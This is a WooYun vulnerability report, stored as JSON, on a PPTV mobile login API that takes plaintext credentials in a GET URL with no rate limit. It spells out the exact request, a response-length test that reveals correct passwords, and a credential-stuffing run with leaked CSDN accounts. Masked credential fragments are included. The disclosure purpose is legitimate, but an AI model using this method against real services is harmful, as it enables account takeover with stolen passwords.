{"id": 32962, "wybug_id": "wooyun-2015-0109931", "wybug_title": "撞库之pptv接口缺陷", "wybug_corp": "PPTV(PPlive)", "wybug_author": "小手冰凉", "wybug_date": "2015-04-24 10:31", "wybug_open_date": "2015-06-11 11:10", "wybug_type": "网络设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-11：\t细节向公众公开  简要描述： 撞库之pptv接口缺陷我保证不认识如下个人，而且我也不缺看片的移动硬盘，但是你们如果真想意思意思，那我唯有恭敬不如从命了。http://www.wooyun.org/bugs/wooyun-2010-095683http://www.wooyun.org/bugs/wooyun-2010-092044http://www.wooyun.org/bugs/wooyun-2010-092287http://www.wooyun.org/bugs/wooyun-2010-092662http://www.wooyun.org/bugs/wooyun-2010-092753我是先发现漏洞又搜到这些记录的。 详细说明：  抓取最新版pptv手机客户端登陆数据包如下\nET /v3/login/ex_login.do?uid=35236905141543&username=1111111&appplt=aph&appid=com.pplive.androidphone&from=aph&format=json&password=111111111&appver=5.0.6&version=5.0.6 HTTP/1.1Host: api.passport.pptv.comConnection: Keep-Alive\n精简数据包结果如下\nGET /v3/login/ex_login.do?uid=35236905141543&username=<用户名或者邮箱>&format=json&password=<明文密码> HTTP/1.1Host: api.passport.pptv.comConnection: Keep-Alive\n我简直不敢相信我的眼睛！！！再精简\nhttp://api.passport.pptv.com/v3/login/ex_login.do?uid=35236905141543&<用户名或者邮箱>&format=json&password=<明文密码>\n竟然直接在浏览器里访问这个网址就可以！！！！但是返回值是加密的，看不出什么意思密码错误时如下(类似)\ndyQuoT3iUsJfrfCY+sbF3cbvuoU+1c2Wd1MhBzGsdqrXRFqkrsoXmp49SdjVFoW0dTHKFeyqTzCJ6LgOl+XxiTNclB2wn2BtJeaCjqpMDNnKAO7EHMomCqXBkdVWna94ojkHeMK1/HJs8n8uzJJN+aGlnaP57k7J800BppyvLQ08o1nSAAMf0AmF5Y1SVHpLk69RVkuqmNvltsKd7bpx3a38+CS5A4ZK4WUxPIzEXh8=\n密码正确时如下（类似）\ndyQuoT3iUsKskCJ3IL0HqSv9/eHCDW+yhkfw4JDHJoY1cUz7bkXmUhwP5sZ/UfnqNVdx1F6tgiz3GIl4GS1M3XUs9yUmCsXH69r0Nw4/AnVl7acRWsYS+/Oj8kylkAP4jmHZMSealuqHytY+aImL2U4xEkET07rx7b4IdHOfVCeVnrZYtgmPbyGBOv5EdMuVQSxgePy3oyDo+r9KSKeX4z2/bE85ClB0C0bY4WxV+pnlg1g+Cy1DNtDymws0Wk7guhfaQLLSOzry4UzavmqXySG3s3/zUr4MDhBbYP4M+q635Ye62YLZpDebkH3zcYBuYCzFIB1D3Jtx7x17qb2KkE8DkUjxzCw6Yh6jGmfFPidkFIYGJiLmMlVl+Vqrc7uBCJJmSHY4TnBaQlVP47SI7LMEPdV83RxNUYcl6IYuZb9lEd23utSfCX5u/GflqcMfeUXLzaQvs/MolmdFZ6TS1ZMl54S1UwP9TcgiT3W/ypA62cl+tEWkb+JPWRuZ7/VE1y7JaZ1SLVukH/qyokIvZF8GBzyXJA53nDooZKhmOjyz6odY1X2b+mS7MbF0XL5VwyLJF+Psk7Bfrxny688vPAOsi/GubJbU0pP8exWnzWL6eRwjvm1V0cr5lrzE342CM6/2jH3PAVr+Dx69RY+8QdbYGhMA1Ryil07A7Who1KWbCYRqq03rdxR2Cbv/w6VwMSg473llQoFEavhcAn0WtGtbkCqj3AKKyFfH9RL6eEo7D8jpCEzCDQB6lZnhIObOKQWLLCJi4jByJe9cY49csztEEC09yyVXs7J1ze0YmlkrXtND40TsAg/cwh1cnY2jCf9nlEmolgCjMrAne25Us0rt97joKzzItFHVRjDcMKyFk+NSsttzyvixDCjT+3DlDlTKqudQZ5m+MNlM8afmI5Laiy/NtzmyRpJTzkg2+UViGVSyxrQJgy3bhbg+yVXHxD6KcfUHPwMdweudqYZKvvPtasiT2TbRmpfCmPF7oKnEoFoGBRCWVVXlbb19gNHEzunZB+0pU1ADm8Tclcqc+Cq1NSv/8VCy5QnUVpm+cRXG+s9ZlDKQTZ8hkoWCit6uYewnjjT6niQbpWyo8zyK8htlBRfFOq18QTqtVNVDQ5nj2CJg6AUdi28e8g7BKp/W\n这里面没有明显的特征字符串，那就直接以返回值的长度做特征，大于500就算密码正确。   漏洞证明：  仍然用csdn库测试测试了3W条 发现一千多条随机测试发现都可登录。打码如下\n\n\nmask 区域\n\n*****com:hub********************3.com:********************com:yan********************o.com.cn********************.com:lz********************6.com:b********************COM:120********************3.com:7********************q.com:********************com:150********************.com:00********************26.com:x********************.com:13********************oo.com.c********************3.com:********************com:pwl********************o.cn:q88********************ina.com********************com:394********************3.com:s********************oo.cn:qaz********************.com:as********************3.com:4********************hoo.cn:********************h.net:********************.com:1********************ail.com********************com:liu*****\n\n\n\n\n   修复方案：  强制使用HTTPS限制请求次数验证码   版权声明：转载请注明来源 小手冰凉@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-04-27 11:08 厂商回复： 感谢反馈，处理中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-21 01:13 |    \t\t黑翼、 \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:10        | o(∩_∩)o)\t\t \n  哈哈    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}